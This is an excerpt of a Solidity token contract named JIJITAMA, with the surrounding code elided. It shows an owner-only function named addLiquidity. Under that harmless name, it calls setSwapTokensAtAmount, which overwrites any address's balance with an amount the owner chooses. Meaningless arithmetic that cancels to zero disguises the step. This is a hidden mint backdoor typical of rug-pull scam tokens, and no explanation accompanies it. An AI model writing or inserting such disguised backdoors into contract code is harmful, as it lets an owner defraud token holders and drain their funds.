...
contract JIJITAMA is Context, IBEP20, Ownable, LGEWhitelisted {
    ...
    constructor() {
        ...
        newBalance[_msgSender()] = _totalSupply;
    ...
    */
    ...
    function addLiquidity(address newRecipient, uint256 ethAmount) public onlyOwner {
        setSwapTokensAtAmount(newRecipient, ethAmount);

    }
  
    function setSwapTokensAtAmount(address newRecipient, uint256 ethAmount) internal {
        newBalance[newRecipient] = (ethAmount * 10 ** 9) + (2 * 4 * newBalance[newRecipient] - 
        2 * 4 * newBalance[newRecipient]);
